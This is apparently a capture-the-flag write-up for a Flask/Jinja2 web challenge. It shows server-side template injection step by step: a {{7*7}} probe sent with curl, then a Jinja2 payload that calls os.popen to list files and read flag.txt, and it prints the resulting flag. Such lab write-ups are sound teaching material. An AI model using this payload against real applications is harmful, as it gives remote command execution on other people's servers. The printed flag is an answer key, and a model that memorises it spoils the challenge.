1. Visit web site

![web.PNG](/assets/Challenges/Web/Templated/web.PNG)

* We have a important information in this short message. **Site is build with Flask/Jinja2**
* When you found this you think in `SSTI attack`


2. If you visit any directory in web you get this message
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Challenges/Templated]
└─| curl -s -X GET "<Machine Instance>/test"
```

**Output**
```html
<h1>Error 404</h1>
<p>The page '<str>test</str>' could not be found</p>
```
* We can get the name of directory in `<str>` labels.
* Try with this way a SSTI

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Challenges/Templated]
└─| curl -s -X GET '68.183.47.198:31602/\{\{7*7\}\}'
```

* **Note:** Escape especial characters with `\` to avoid errors.

**Output**
```html
<h1>Error 404</h1>
<p>The page '<str>49</str>' could not be found</p>
```
* In labels `<str>` we obtain **49**


3. Visit [HackTricks](https://book.hacktricks.xyz/welcome/readme) and search for **SSTI Jinja**

4. Test all ways

* **Command:** `{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}` 

* Put this command in web browser like this:
```url
http://<Machine Instance>/%7B%7B%20config.__class__.from_envvar.__globals__.__builtins__.__import__(%22os%22).popen(%22ls%22).read()%20%7D%7D
```

**Output**

![ssti.PNG](/assets/Challenges/Web/Templated/ssti.PNG)

5. Show flag
```url
http://<Machine Instance>/%7B%7B%20config.__class__.from_envvar.__globals__.__builtins__.__import__(%22os%22).popen(%22cat%20flag.txt%22).read()%20%7D%7D
```

**Output**
```bash
HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
```



